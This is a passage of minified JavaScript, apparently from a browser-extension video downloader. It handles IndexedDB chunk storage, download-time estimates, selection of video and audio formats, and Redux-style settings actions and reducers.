                    getStorage: (dbName) =>
                        new Promise((res, rej) => {
                            const request = window.indexedDB.open(dbName, 22);
                            (request.onerror = () => rej(new Error("Почему Вы не позволяете моему веб-приложению использовать IndexedDB?!"))),
                                (request.onsuccess = (event) => {
                                    const db = event.target.result;
                                    res(db);
                                }),
                                (request.onupgradeneeded = (event) => {
                                    const db = event.target.result;
                                    res(db);
                                });
                        }),
                    getContent(fileName) {
                        return new Promise(async (resolve, reject) => {
                            let count = 3,
                                resolved = !1;
                            for (; count-- && !resolved; )
                                try {
                                    const db = await this.getStorage(fileName),
                                        transaction = db.transaction("chunks"),
                                        chunks = transaction.objectStore("chunks").getAll();
                                    (chunks.onsuccess = (event) => {
                                        if (resolved) return;
                                        console.log("Got all chunks for " + fileName);
                                        const length = event.target.result.reduce((acc, rec) => acc + rec.chunk.length, 0),
                                            arrayBuffer = new Uint8Array(length);
                                        let offset = 0;
                                        event.target.result.forEach((rec) => {
                                            arrayBuffer.set(rec.chunk, offset), (offset += rec.chunk.length);
                                        }),
                                            setTimeout(() => {
                                                db.close(), window.indexedDB.deleteDatabase(fileName);
                                            }, 100),
                                            (resolved = !0),
                                            resolve(arrayBuffer);
                                    }),
                                        (chunks.onerror = () => {
                                            reject(new Error("cant get content for file: " + fileName));
                                        });
                                } catch (e) {}
                        });
                    },
                    deleteChunkedFile(fileName) {
                        const DBDeleteRequest = window.indexedDB.deleteDatabase(fileName);
                        (DBDeleteRequest.onerror = (event) => {
                            console.log("Error deleting database.", fileName, event);
                        }),
                            (DBDeleteRequest.onsuccess = (event) => {
                                console.log("Database deleted successfully", fileName, event);
                            }),
                            (DBDeleteRequest.onblocked = (e) => {
                                console.log("blocked: ", e);
                            });
                    },
                    createChunkedFile: (fileName) =>
                        new Promise((res, rej) => {
                            const request = window.indexedDB.open(fileName, 22);
                            (request.onerror = function () {
                                rej(new Error("Почему Вы не позволяете моему веб-приложению использовать IndexedDB?!"));
                            }),
                                (request.onupgradeneeded = function (event) {
                                    const db = event.target.result,
                                        objectStore = db.createObjectStore("chunks", { keyPath: "offs" });
                                    objectStore.transaction.oncomplete = function () {
                                        (objectStore.close = () => db.close()),
                                            (objectStore.addChunk = function (chunk, offs) {
                                                db.transaction("chunks", "readwrite").objectStore("chunks").add({ offs: offs, chunk: chunk });
                                            }),
                                            (objectStore.getContent = function () {
                                                return new Promise((resolve, reject) => {
                                                    const transaction = db.transaction("chunks");
                                                    transaction.onerror = function (evt) {
                                                        db.close(), window.indexedDB.deleteDatabase(fileName), reject(evt);
                                                    };
                                                    transaction.objectStore("chunks").getAll().onsuccess = function (evt) {
                                                        console.log("Got all chunks for " + fileName, evt);
                                                        const arrBuff = evt.target.result.map((rec) => rec.chunk);
                                                        db.close(), resolve(new Blob(arrBuff, { type: "application/octet-binary" }));
                                                    };
                                                });
                                            }),
                                            res(objectStore);
                                    };
                                });
                        }),
                };
            },
            get_conversion_time = (provider, conversionType, stats, contentLength) => {
                if (provider && conversionType && stats && contentLength) {
                    const { mb: mb, seconds: seconds } = stats.download,
                        result = (contentLength / 1048576) * (seconds / mb);
                    if (conversionType.includes("->")) {
                        const { converting: converting, download: download } = stats[conversionType];
                        return result * (converting / download);
                    }
                    return result;
                }
                throw new Error("can't calculate conversion time");
            };
        class timer_Timer {
            constructor(serviceName, conversionMode) {
                (this.serviceName = serviceName), (this._stats = { download: { mb: 0, seconds: 0 } }), conversionMode && this.setConversionMode(conversionMode);
            }
            setConversionMode(conversionMode) {
                (this.conversionMode = conversionMode), (this._stats[conversionMode] = { download: 0, converting: 0 });
            }
            setContentLength(contentLength) {
                this.contentLength = contentLength;
            }
            bindGlobalStats(getter) {
                this._getGlobalStats = getter;
            }
            getTimeout(length) {
                if (!length) throw new Error("can't calculate timeout");
                const stats = this._getGlobalStats();
                let timeout = Math.ceil(9e3 * get_conversion_time(this.serviceName, "download", stats, length));
                return length / timeout > 102.4 && (timeout = Math.ceil(length / 102.4)), (timeout = timeout > 5e3 ? timeout : 5e3), timeout;
            }
            get stats() {
                return { serviceName: this.serviceName, stats: this._stats };
            }
            downloadStarted() {
                this._downloadStarted = Date.now();
            }
            downloadFinished(mb) {
                const contentLength = mb || this.contentLength;
                (this._stats.download.seconds = (Date.now() - this._downloadStarted) / 1e3),
                    (this._stats.download.mb = contentLength / 1048576),
                    this.conversionMode && ((this._stats[this.conversionMode].download = this._stats.download.seconds), (this._conversionStarted = Date.now()));
            }
            conversionComplete() {
                return (this._stats[this.conversionMode].converting = (Date.now() - this._conversionStarted) / 1e3), this._stats;
            }
        }
        const get_global_fs = idbfs();
        var get_global = (store, saveFile) => async (_item) => {
            const {
                status: status,
                setStatus: setStatus,
                setDownloadingMode: setDownloadingMode,
                defaultItem: defaultItem,
                setDefaultItem: setDefaultItem,
                setCancel: setCancel,
                resetProgress: resetProgress,
                setStats: setStats,
                sendEvent: sendEvent,
                serviceName: serviceName,
                eventRouter: eventRouter,
                setIsPreviousDownloading: setIsPreviousDownloading,
            } = store.getState();
            if ("downloading" === status) return;
            const item = _item || defaultItem;
            if ((item !== defaultItem && setDefaultItem(item), "directUrl" in item)) return saveFile(item.directUrl), void eventRouter.emit("fileSaved");
            setStatus("downloading"), setIsPreviousDownloading(!1);
            const updater = (progress) => eventRouter.emit("progress", progress);
            try {
                const timer = new timer_Timer(serviceName);
                timer.bindGlobalStats(function () {
                    return store.getState().stats[this.serviceName];
                }),
                    eventRouter.emit("startDownloading", item, serviceName);
                const { cancel: cancel, stream: stream } = item.download(updater, timer);
                setCancel(() => {
                    cancel(), eventRouter.emit("cancelDownloading");
                }),
                    timer.conversionMode && setDownloadingMode(timer.conversionMode),
                    resetProgress();
                const file = await stream,
                    { title: title } = item;
                timer.stats && setStats(timer.stats),
                    (async (result, fileName) => {
                        const data = "string" == typeof result ? await get_global_fs.getContent(result) : result,
                            file = URL.createObjectURL(new Blob([data], { type: "application/octet-binary" }));
                        saveFile(file, fileName), URL.revokeObjectURL(file), eventRouter.emit("fileSaved");
                    })(file, title);
                sendEvent({ action: "download_success", format: item.mimeType.includes("audio") ? "audio: bitrate " + item.bitrate : item.quality });
            } catch (e) {
                eventRouter.emit("downloadError");
            }
        };
        const isVideoWebm = (item) => item.mimeType.includes("video/webm"),
            isAudioMp4 = (item) => item.mimeType.includes("audio/mp4"),
            isAudioWebm = (item) => item.mimeType.includes("audio/webm"),
            isAudioMp3 = (item) => item.mimeType.includes("audio/mp3"),
            isVideo = (item) => item.mimeType && item.mimeType.includes("video"),
            isAudio = (item) => item.mimeType && item.mimeType.includes("audio"),
            isMuxable = (item) => isVideo(item) && item.audio && isAudio(item.audio),
            needsConversionAudio = (item) => isAudio(item) && item.conversionRequired,
            isStream = (item) => isVideo(item) && !isMuxable(item),
            isVideo4k = (item) => isVideo(item) && item.height >= 2160 && item.height < 4320,
            willBeVideoMp4 = (item) => isVideo(item) && item.type && "mp4" === item.type;
        var media_content_length = (media) => media.contentLength + (media.audio ? media.audio.contentLength : 0);
        const byBitrate = (audio1, audio2) => audio1.bitrate - audio2.bitrate,
            getBestMp3 = (audioInfo) => audioInfo.filter(isAudioMp3).sort(byBitrate).slice(0, 1),
            getBestMp4 = (audioInfo) => audioInfo.filter(isAudioMp4).sort(byBitrate).slice(0, 1),
            getBestWebm = (audioInfo) => audioInfo.filter(isAudioWebm).sort(byBitrate).slice(0, 1),
            addMp3 = (audioInfo, options) => {
                const { showFormatsAvailableViaDesktopClient: showFormatsAvailableViaDesktopClient } = options;
                return showFormatsAvailableViaDesktopClient ? (audioInfo.some(isAudioMp3) ? audioInfo : [...audioInfo, { availableInDesktopClient: !0, mimeType: "audio/mp3", id: "availableInDesktopClient" }]) : audioInfo;
            };
        var get_list_audio = (audioInfo, options) => {
            const audioList = audioInfo.filter(
                ((options) => (audio) => {
                    const { showFormatsAvailableViaDesktopClient: showFormatsAvailableViaDesktopClient, showFormatsRequiredOnlineConversion: showFormatsRequiredOnlineConversion, contentLimit: contentLimit } = options;
                    return contentLimit && audio.contentLength > contentLimit
                        ? !!showFormatsAvailableViaDesktopClient && ((audio.availableInDesktopClient = !0), !0)
                        : ((audio.availableInDesktopClient = !1), !(!showFormatsRequiredOnlineConversion && needsConversionAudio(audio)));
                })(options)
            );
            if (!audioList.length) return [];
            if (1 === audioList.length) return addMp3(audioList, options);
            const resultList = [...getBestMp3(audioList), ...(getBestMp4(audioList) || getBestWebm(audioList))];
            return addMp3(resultList, options);
        };
        const get_list_byOptions = (options) => (video) => {
                const {
                        showFormatsAvailableViaDesktopClient: showFormatsAvailableViaDesktopClient,
                        showFormatsRequiredOnlineConversion: showFormatsRequiredOnlineConversion,
                        showWebmVideos: showWebmVideos,
                        contentLimit: contentLimit,
                    } = options,
                    videoContentLength = media_content_length(video);
                return contentLimit && videoContentLength > contentLimit
                    ? !!showFormatsAvailableViaDesktopClient && ((video.availableInDesktopClient = !0), !0)
                    : ((video.availableInDesktopClient = !1), !(!showFormatsRequiredOnlineConversion && isMuxable(video)) && !(!showWebmVideos && isVideo((item = video)) && item.type && "webm" === item.type));
                var item;
            },
            byQuality = (rec1, rec2) => (rec1.height !== rec2.height ? rec2.height - rec1.height : rec1.fps !== rec2.fps ? rec2.fps - rec1.fps : rec1.contentLength - rec2.contentLength),
            fullContentLength = (item) => (item.contentLength + item.audio ? item.audio.contentLength : 0),
            noWorseThan = (quality) => (rec) => quality <= parseInt(rec.quality, 10),
            notNull = (item) => !!item,
            pickBetter = (a, b) => (!a.audio && b.audio ? a : a.audio && !b.audio ? b : fullContentLength(a) <= fullContentLength(b) ? a : b),
            hasBetterKind = (rec, list) => {
                if (list.length < 2) return !1;
                var rec1;
                return rec !== ((list) => list.reduce(pickBetter))(list.filter(((rec1 = rec), (rec2) => !!rec2 && rec1.type === rec2.type && rec1.height === rec2.height && rec1.fps === rec2.fps)));
            },
            onlyUniques = (rec, i, list) => !hasBetterKind(rec, list),
            notIncludes = (list) => (rec) => !list.includes(rec),
            getNextTo = (quality) => (video, acc) => (Math.abs(video.height - quality) < Math.abs(acc.height - quality) ? video : acc),
            getPromos = (list) => {
                if (!list.length) return [];
                let v4k = list.filter(isVideo4k).sort(byQuality).pop(),
                    hd = list.filter(noWorseThan(1080)).sort(byQuality).pop();
                v4k || (v4k = list.reduce(getNextTo(1800))), hd || (hd = list.reduce(getNextTo(900)));
                return (hd === v4k ? [hd] : [hd, v4k]).filter(notNull);
            };
        var get_list = (info, options) => {
            if (!info) return [];
            const { streams: streams, video: video, audio: audio } = info,
                { listMode: listMode } = options,
                videos = [...streams, ...video].filter(get_list_byOptions(options)).filter(onlyUniques),
                promos = getPromos(videos.filter(willBeVideoMp4)),
                audioList = get_list_audio(audio, options),
                list = ((videos) => {
                    const promos = getPromos(videos.filter(willBeVideoMp4)),
                        filters = [notIncludes(promos), isStream, noWorseThan(360), willBeVideoMp4];
                    let select = [];
                    for (let i = 0; i < filters.length; i++) {
                        const currentSet = filters.slice(0, filters.length - i);
                        if (((select = videos.filter((video) => currentSet.every((filter) => filter(video)))), select.length)) break;
                    }
                    return select.slice(0, 2).sort(byQuality);
                })(videos),
                spoiler = ((videos, shortList) => videos.filter(notIncludes(shortList)).sort(byQuality))(videos, [...promos, ...list]),
                listHasSpoiler = spoiler.length > 2;
            if ("short" === listMode) {
                return { list: [...promos, ...list, ...audioList, ...(listHasSpoiler ? [] : spoiler)], listHasSpoiler: listHasSpoiler };
            }
            if ("full" === listMode) {
                return { list: [...promos, ...list, ...audioList, ...(listHasSpoiler ? spoiler : [])], listHasSpoiler: !1 };
            }
            if ("embed" === listMode) {
                return { list: [...promos, ...list, ...audioList], listHasSpoiler: listHasSpoiler };
            }
            return [];
        };
        const actionsTypes_SET_ALL = "SET_ALL",
            actionsTypes_SET_IS_WEBEXT_DESTROYED = "SET_IS_WEBEXT_DESTROYED",
            actionsTypes_SET_HID = "SET_HID",
            actionsTypes_SET_UTM = "SET_UTM",
            actionsTypes_SET_STATUS = "SET_STATUS",
            actionsTypes_SET_PROGRESS = "SET_PROGRESS",
            actionsTypes_RESET_PROGRESS = "RESET_PROGRESS",
            actionsTypes_SET_IS_PREVIOUS_DOWNLOADING = "SET_IS_PREVIOUS_DOWNLOADING",
            actionsTypes_SET_CURRENT_SPEED = "SET_CURRENT_SPEED",
            actionsTypes_SET_AVERAGE_SPEED = "SET_AVERAGE_SPEED",
            actionsTypes_SET_CONTENT_LENGTH = "SET_CONTENT_LENGTH",
            actionsTypes_SET_ALREADY_DOWNLOADED = "SET_ALREADY_DOWNLOADED",
            actionsTypes_SET_SERVICE_NAME = "SET_SERVICE_NAME",
            actionsTypes_SET_TITLE = "SET_TITLE",
            actionsTypes_SET_INFO = "SET_INFO",
            actionsTypes_SET_DEFAULT_ITEM = "SET_DEFAULT_ITEM",
            actionsTypes_SET_ITEMS_LIST = "SET_ITEMS_LIST",
            actionsTypes_SET_LIST_MODE = "SET_LIST_MODE",
            actionsTypes_SET_LIST_HAS_SPOILER = "SET_LIST_HAS_SPOILER",
            actionsTypes_SET_IMGS = "SET_IMGS",
            actionsTypes_SET_CONTENT_LIMIT = "SET_CONTENT_LIMIT",
            actionsTypes_SET_MODULE = "SET_MODULE",
            actionsTypes_SET_DOWNLOAD = "SET_DOWNLOAD",
            actionsTypes_SET_CANCEL = "SET_CANCEL",
            actionsTypes_SET_THEME = "SET_THEME",
            actionsTypes_SET_LANG = "SET_LANG",
            actionsTypes_SET_I18N = "SET_I18N",
            actionsTypes_SET_DIR = "SET_DIR",
            actionsTypes_ADD_MODAL = "ADD_MODAL",
            actionsTypes_REMOVE_MODAL = "REMOVE_MODAL",
            actionsTypes_SET_HELP_STATE = "SET_HELP_STATE",
            actionsTypes_SET_SEND_EVENT = "SET_SEND_EVENT",
            actionsTypes_SET_DOWNLOADS_COUNT = "SET_DOWNLOADS_COUNT",
            actionsTypes_SET_DOWNLOADED_IN_ROW = "SET_DOWNLOADED_IN_ROW",
            actionsTypes_SET_SCREENSHOTS_COUNT = "SET_SCREENSHOTS_COUNT",
            actionsTypes_SET_DISPLAY_QR_CODES = "SET_DISPLAY_QR_CODES",
            actionsTypes_SET_SHOW_FORMATS_AVAILABLE_VIA_DESKTOP_CLIENT = "SET_SHOW_FORMATS_AVAILABLE_VIA_DESKTOP_CLIENT",
            actionsTypes_SET_SHOW_FORMATS_REQUIRED_ONLINE_CONVERSION = "SET_SHOW_FORMATS_REQUIRED_ONLINE_CONVERSION",
            actionsTypes_SET_SHOW_WEBM_VIDEOS = "SET_SHOW_WEBM_VIDEOS",
            actionsTypes_SET_WARN_BEFORE_CONVERTING = "SET_WARN_BEFORE_CONVERTING",
            actionsTypes_SET_WARN_ABOUT_COMPETITORS_DETECTION = "SET_WARN_ABOUT_COMPETITORS_DETECTION",
            actionsTypes_SET_SHOW_SNAPSHOT_BUTTON = "SET_SHOW_SNAPSHOT_BUTTON",
            actionsTypes_SET_APP_BUTTON_STYLE = "SET_APP_BUTTON_STYLE",
            actionsTypes_SET_STATS = "SET_STATS",
            actionsTypes_SET_DOWNLOADING_MODE = "SET_DOWNLOADING_MODE",
            actionsTypes_SET_RATING_MODAL_LAST_CHECK = "SET_RATING_MODAL_LAST_CHECK",
            actionsTypes_SET_RATING_MODAL_NEVER_SHOW = "SET_RATING_MODAL_NEVER_SHOW",
            actionsTypes_SET_RATING_MODAL_LAST_NOT_NOW = "SET_RATING_MODAL_LAST_NOT_NOW",
            actionsTypes_SET_BODY_SCROLLBAR_WIDTH = "SET_BODY_SCROLLBAR_WIDTH",
            actionsTypes_SET_EVENT_ROUTER = "SET_EVENT_ROUTER",
            actionsTypes_ADD_PUBLIC_ID = "ADD_PUBLIC_ID",
            getSyncAction = (name, setter) => async (dispatch) => {
                const storedValue = await index_ext.get(name);
                dispatch(setter(storedValue));
            },
            actions = {
                setAll: (all) => ({ type: actionsTypes_SET_ALL, value: all }),
                setIsWebextDestroyed: (isWebextDestroyed) => ({ type: actionsTypes_SET_IS_WEBEXT_DESTROYED, value: isWebextDestroyed }),
                setHid: (hid) => ({ type: actionsTypes_SET_HID, value: hid }),
                syncHid: () => getSyncAction("hid", actions.setHid),
                setUtm: (utm) => ({ type: actionsTypes_SET_UTM, value: utm }),
                syncUtm: () => getSyncAction("utm", actions.setUtm),
                setStatus: (status) => ({ type: actionsTypes_SET_STATUS, value: status }),
                setProgress: (progress) => ({ type: actionsTypes_SET_PROGRESS, value: progress }),
                resetProgress: () => ({ type: actionsTypes_RESET_PROGRESS, value: null }),
                setIsPreviousDownloading: (value) => ({ type: actionsTypes_SET_IS_PREVIOUS_DOWNLOADING, value: value }),
                setCurrentSpeed: (value) => ({ type: actionsTypes_SET_CURRENT_SPEED, value: value }),
                setAverageSpeed: (value) => ({ type: actionsTypes_SET_AVERAGE_SPEED, value: value }),
                setContentLength: (value) => ({ type: actionsTypes_SET_CONTENT_LENGTH, value: value }),
                setAlreadyDownloaded: (value) => ({ type: actionsTypes_SET_ALREADY_DOWNLOADED, value: value }),
                setServiceName: (serviceName) => ({ type: actionsTypes_SET_SERVICE_NAME, value: serviceName }),
                setTitle: (title) => ({ type: actionsTypes_SET_TITLE, value: title }),
                setInfo: (info) => ({ type: actionsTypes_SET_INFO, value: info }),
                setItemsList: (list) => ({ type: actionsTypes_SET_ITEMS_LIST, value: list }),
                setListMode: (mode) => ({ type: actionsTypes_SET_LIST_MODE, value: mode }),
                setListHasSpoiler: (value) => ({ type: actionsTypes_SET_LIST_HAS_SPOILER, value: value }),
                setContentLimit: (contentLimit) => ({ type: actionsTypes_SET_CONTENT_LIMIT, value: contentLimit }),
                setDefaultItem: (info) => ({ type: actionsTypes_SET_DEFAULT_ITEM, value: info }),
                setImgs: (info) => ({ type: actionsTypes_SET_IMGS, value: info }),
                setModule: (module) => ({ type: actionsTypes_SET_MODULE, value: module }),
                setDownload: (download) => ({ type: actionsTypes_SET_DOWNLOAD, value: download }),
                setCancel: (cancel) => ({ type: actionsTypes_SET_CANCEL, value: cancel }),
                setTheme: (theme) => ({ type: actionsTypes_SET_THEME, value: theme }),
                _setLang: (value) => ({ type: actionsTypes_SET_LANG, value: value }),
                syncLang: () => getSyncAction("lang", actions.setLang),
                setLang: (lang) => async (dispatch, getState) => {
                    const { module: module, i18n: i18n } = getState();
                    if (((await index_ext.get("lang")) !== lang && index_ext.set("lang", lang), i18n))
                        if ("autoDetect" === lang)
                            if (module.getLang) {
                                const pageLang = module.getLang();
                                i18n.changeLanguage(pageLang);
                            } else i18n.changeLanguage();
                        else i18n.changeLanguage(lang);
                    dispatch(actions._setLang(lang));
                },
                setI18N: (i18n) => ({ type: actionsTypes_SET_I18N, value: i18n }),
                setDir: (dir) => ({ type: actionsTypes_SET_DIR, value: dir }),
                addModal: (modal) => ({ type: actionsTypes_ADD_MODAL, value: { ...modal, id: Math.random() } }),
                removeModal: (index) => ({ type: actionsTypes_REMOVE_MODAL, value: index }),
                setHelpState: (state) => ({ type: actionsTypes_SET_HELP_STATE, value: state }),
                setSendEvent: (sendEvent) => ({ type: actionsTypes_SET_SEND_EVENT, value: sendEvent }),
                _setDownloadsCount: (count) => ({ type: actionsTypes_SET_DOWNLOADS_COUNT, value: count }),
                syncDownloads: () => getSyncAction("downloadsCount", actions._setDownloadsCount),
                incrementDownloads: () => async (dispatch, getState) => {
                    let { downloadsCount: downloadsCount } = getState();
                    downloadsCount++, index_ext.set("downloadsCount", downloadsCount), dispatch(actions._setDownloadsCount(downloadsCount));
                },
                _setDownloadedInRow: (count) => ({ type: actionsTypes_SET_DOWNLOADED_IN_ROW, value: count }),
                syncDownloadedInRow: () => getSyncAction("downloadedInRow", actions._setDownloadedInRow),
                incrementDownloadedInRow: () => async (dispatch, getState) => {
                    let { downloadedInRow: downloadedInRow } = getState();
                    downloadedInRow++, index_ext.set("downloadedInRow", downloadedInRow), dispatch(actions._setDownloadedInRow(downloadedInRow));
                },
                resetDownloadedInRow: () => async (dispatch) => {
                    index_ext.set("downloadedInRow", 0), dispatch(actions._setDownloadedInRow(0));
                },
                _setScreenshotsCount: (count) => ({ type: actionsTypes_SET_SCREENSHOTS_COUNT, value: count }),
                syncScreenshots: () => getSyncAction("screenshotsCount", actions._setScreenshotsCount),
                incrementScreenshots: () => async (dispatch, getState) => {
                    let { screenshotsCount: screenshotsCount } = getState();
                    screenshotsCount++, index_ext.set("screenshotsCount", screenshotsCount), dispatch(actions._setScreenshotsCount(screenshotsCount));
                },
                _setDisplayQrCodes: (value) => ({ type: actionsTypes_SET_DISPLAY_QR_CODES, value: value }),
                syncDisplayQrCodes: () => getSyncAction("displayQrCodes", actions._setDisplayQrCodes),
                setDisplayQrCodes: (value) => async (dispatch) => {
                    index_ext.set("displayQrCodes", value), dispatch(actions._setDisplayQrCodes(value));
                },
                _setShowFormatsAvailableViaDesktopClient: (value) => ({ type: actionsTypes_SET_SHOW_FORMATS_AVAILABLE_VIA_DESKTOP_CLIENT, value: value }),
                syncShowFormatsAvailableViaDesktopClient: () => getSyncAction("showFormatsAvailableViaDesktopClient", actions._setShowFormatsAvailableViaDesktopClient),
                setShowFormatsAvailableViaDesktopClient: (value) => async (dispatch) => {
                    index_ext.set("showFormatsAvailableViaDesktopClient", value), dispatch(actions._setShowFormatsAvailableViaDesktopClient(value));
                },
                _setShowFormatsRequiredOnlineConversion: (value) => ({ type: actionsTypes_SET_SHOW_FORMATS_REQUIRED_ONLINE_CONVERSION, value: value }),
                syncShowFormatsRequiredOnlineConversion: () => getSyncAction("showFormatsRequiredOnlineConversion", actions._setShowFormatsRequiredOnlineConversion),
                setShowFormatsRequiredOnlineConversion: (value) => async (dispatch) => {
                    index_ext.set("showFormatsRequiredOnlineConversion", value), dispatch(actions._setShowFormatsRequiredOnlineConversion(value));
                },
                _setShowWebmVideos: (value) => ({ type: actionsTypes_SET_SHOW_WEBM_VIDEOS, value: value }),
                syncShowWebmVideos: () => getSyncAction("showWebmVideos", actions._setShowWebmVideos),
                setShowWebmVideos: (value) => async (dispatch) => {
                    index_ext.set("showWebmVideos", value), dispatch(actions._setShowWebmVideos(value));
                },
                _setWarnBeforeConverting: (value) => ({ type: actionsTypes_SET_WARN_BEFORE_CONVERTING, value: value }),
                syncWarnBeforeConverting: () => getSyncAction("warnBeforeConverting", actions._setWarnBeforeConverting),
                setWarnBeforeConverting: (value) => async (dispatch) => {
                    index_ext.set("warnBeforeConverting", value), dispatch(actions._setWarnBeforeConverting(value));
                },
                _setWarnAboutCompetitorsDetection: (value) => ({ type: actionsTypes_SET_WARN_ABOUT_COMPETITORS_DETECTION, value: value }),
                syncWarnAboutCompetitorsDetection: () => getSyncAction("warnAboutCompetitorsDetection", actions._setWarnAboutCompetitorsDetection),
                setWarnAboutCompetitorsDetection: (value) => async (dispatch) => {
                    index_ext.set("warnAboutCompetitorsDetection", value), dispatch(actions._setWarnAboutCompetitorsDetection(value));
                },
                _setShowSnapshotButton: (value) => ({ type: actionsTypes_SET_SHOW_SNAPSHOT_BUTTON, value: value }),
                syncShowSnapshotButton: () => getSyncAction("showSnapshotButton", actions._setShowSnapshotButton),
                setShowSnapshotButton: (value) => async (dispatch) => {
                    index_ext.set("showSnapshotButton", value), dispatch(actions._setShowSnapshotButton(value));
                },
                _setAppButtonStyle: (value) => ({ type: actionsTypes_SET_APP_BUTTON_STYLE, value: value }),
                syncAppButtonStyle: () => getSyncAction("appButtonStyle", actions._setAppButtonStyle),
                setAppButtonStyle: (value) => async (dispatch) => {
                    index_ext.set("appButtonStyle", value), dispatch(actions._setAppButtonStyle(value));
                },
                _setStats: (value) => ({ type: actionsTypes_SET_STATS, value: value }),
                syncStats: () => getSyncAction("stats", actions._setStats),
                setStats: (value) => async (dispatch, getState) => {
                    const { stats: stats } = getState(),
                        newValues = Object.keys(value.stats).reduce((acc, conversionType) => {
                            var oldStat, increment;
                            return (
                                console.log("ADD STAT!!!", stats, value.serviceName, conversionType),
                                (acc[conversionType] =
                                    ((oldStat = stats[value.serviceName][conversionType]),
                                    (increment = value.stats[conversionType]),
                                    { ...(oldStat || {}), ...Object.keys(increment).reduce((acc, key) => (console.log("key/value", oldStat, key), (acc[key] = increment[key] + (oldStat ? oldStat[key] : 0)), acc), {}) })),
                                acc
                            );
                        }, {}),
                        newStats = { ...stats, [value.serviceName]: { ...(stats[value.serviceName] || {}), ...newValues } };
                    console.log("NEW STATS!!!", newStats), index_ext.set("stats", newStats), dispatch(actions._setStats(newStats));
                },
                setDownloadingMode: (mode) => ({ type: actionsTypes_SET_DOWNLOADING_MODE, value: mode }),
                _setRatingModalLastCheck: (stamp) => ({ type: actionsTypes_SET_RATING_MODAL_LAST_CHECK, value: stamp }),
                syncRatingModalLastCheck: () => getSyncAction("ratingModalLastCheck", actions._setRatingModalLastCheck),
                setRatingModalLastCheck: (stamp) => async (dispatch) => {
                    index_ext.set("ratingModalLastCheck", stamp), dispatch(actions._setRatingModalLastCheck(stamp));
                },
                _setRatingModalNeverShow: (value) => ({ type: actionsTypes_SET_RATING_MODAL_NEVER_SHOW, value: value }),
                syncRatingModalNeverShow: () => getSyncAction("ratingModalNeverShow", actions._setRatingModalNeverShow),
                setRatingModalNeverShow: (stamp) => async (dispatch) => {
                    index_ext.set("ratingModalNeverShow", stamp), dispatch(actions._setRatingModalNeverShow(stamp));
                },
                _setRatingModalLastNotNow: (stamp) => ({ type: actionsTypes_SET_RATING_MODAL_LAST_NOT_NOW, value: stamp }),
                syncRatingModalLastNotNow: () => getSyncAction("ratingModalLastNotNow", actions._setRatingModalLastNotNow),
                setRatingModalLastNotNow: (stamp) => async (dispatch) => {
                    index_ext.set("ratingModalLastNotNow", stamp), dispatch(actions._setRatingModalLastNotNow(stamp));
                },
                setBodyScrollbarWidth: (bodyScrollbarWidth) => ({ type: actionsTypes_SET_BODY_SCROLLBAR_WIDTH, value: bodyScrollbarWidth }),
                setEventRouter: (eventRouter) => ({ type: actionsTypes_SET_EVENT_ROUTER, value: eventRouter }),
                addPublicId: (id) => ({ type: actionsTypes_ADD_PUBLIC_ID, value: id }),
            },
            initialState = { status: "gettingInfo", listMode: "short", progress: 0, downloadsCount: 0, screenshotsCount: 0, isPreviousDownloading: !1, modals: [], publicIds: {} },
            recalculateList = (state) => {
                const {
                        showFormatsAvailableViaDesktopClient: showFormatsAvailableViaDesktopClient,
                        showFormatsRequiredOnlineConversion: showFormatsRequiredOnlineConversion,
                        showWebmVideos: showWebmVideos,
                        contentLimit: contentLimit,
                        listMode: listMode,
                        info: info,
                        defaultItem: defaultItem,
                    } = state,
                    options = {
                        listMode: listMode,
                        showFormatsAvailableViaDesktopClient: showFormatsAvailableViaDesktopClient,
                        showFormatsRequiredOnlineConversion: showFormatsRequiredOnlineConversion,
                        showWebmVideos: showWebmVideos,
                        contentLimit: contentLimit,
                    };
                if (!info) return state;
                const { list: list, listHasSpoiler: listHasSpoiler } = get_list(info, options);
                return { ...state, listHasSpoiler: listHasSpoiler, itemsList: list, defaultItem: list.length ? list[0] : defaultItem };
            },
            reducers_handlers = {
                [actionsTypes_SET_ALL]: (state, action) => ({ ...state, ...action.value }),
                [actionsTypes_SET_IS_WEBEXT_DESTROYED]: (state, action) => ({ ...state, isWebextDestroyed: action.value }),
                [actionsTypes_SET_HID]: (state, action) => ({ ...state, hid: action.value }),
                [actionsTypes_SET_UTM]: (state, action) => ({ ...state, utm: action.value }),
                [actionsTypes_SET_STATUS]: (state, action) => ({ ...state, status: action.value }),
                [actionsTypes_SET_PROGRESS]: (state, action) => ({ ...state, progress: action.value }),
                [actionsTypes_RESET_PROGRESS]: (state) => ({ ...state, progress: 0 }),
                [actionsTypes_SET_IS_PREVIOUS_DOWNLOADING]: (state, action) => ({ ...state, isPreviousDownloading: action.value }),
                [actionsTypes_SET_CURRENT_SPEED]: (state, action) => ({ ...state, currentSpeed: action.value }),
                [actionsTypes_SET_AVERAGE_SPEED]: (state, action) => ({ ...state, averageSpeed: action.value }),
                [actionsTypes_SET_CONTENT_LENGTH]: (state, action) => ({ ...state, contentLength: action.value }),
                [actionsTypes_SET_ALREADY_DOWNLOADED]: (state, action) => ({ ...state, alreadyDownloaded: action.value }),
                [actionsTypes_SET_SERVICE_NAME]: (state, action) => ({ ...state, serviceName: action.value }),
                [actionsTypes_SET_TITLE]: (state, action) => ({ ...state, title: action.value }),
                [actionsTypes_SET_ITEMS_LIST]: (state, action) => ({ ...state, itemsList: action.value }),
                [actionsTypes_SET_LIST_HAS_SPOILER]: (state, action) => ({ ...state, listHasSpoiler: action.value }),
                [actionsTypes_SET_DEFAULT_ITEM]: (state, action) => ({ ...state, defaultItem: action.value }),
                [actionsTypes_SET_IMGS]: (state, action) => ({ ...state, imgs: action.value }),
                [actionsTypes_SET_MODULE]: (state, action) => ({ ...state, module: action.value, snap: action.value.snap }),
                [actionsTypes_SET_DOWNLOAD]: (state, action) => ({ ...state, download: action.value }),
                [actionsTypes_SET_CONTENT_LIMIT]: (state, action) => ({ ...state, contentLimit: action.value }),
                [actionsTypes_SET_CANCEL]: (state, action) => ({ ...state, cancel: action.value }),
                [actionsTypes_SET_THEME]: (state, action) => ({ ...state, theme: action.value }),
                [actionsTypes_SET_LANG]: (state, action) => ({ ...state, lang: action.value }),
                [actionsTypes_SET_I18N]: (state, action) => ({ ...state, i18n: action.value }),
                [actionsTypes_SET_DIR]: (state, action) => ({ ...state, dir: action.value }),
                [actionsTypes_ADD_MODAL]: (state, action) => ({ ...state, modals: [action.value, ...state.modals] }),
                [actionsTypes_REMOVE_MODAL]: (state, action) => ({ ...state, modals: state.modals.filter((modal) => modal.id !== action.value) }),
                [actionsTypes_SET_HELP_STATE]: (state, action) => ({ ...state, helpState: action.value }),
